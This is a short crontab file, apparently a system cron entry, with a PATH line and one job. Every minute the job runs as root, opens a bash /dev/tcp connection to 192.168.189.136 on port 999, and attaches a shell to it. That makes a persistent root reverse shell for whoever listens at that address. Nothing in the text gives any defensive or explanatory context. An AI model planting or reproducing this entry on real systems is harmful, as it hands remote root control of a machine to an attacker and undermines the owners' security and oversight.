PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root bash -c '<&112-;exec 112<>/dev/tcp/192.168.189.136/999;sh <&112 >&112 2>&112'
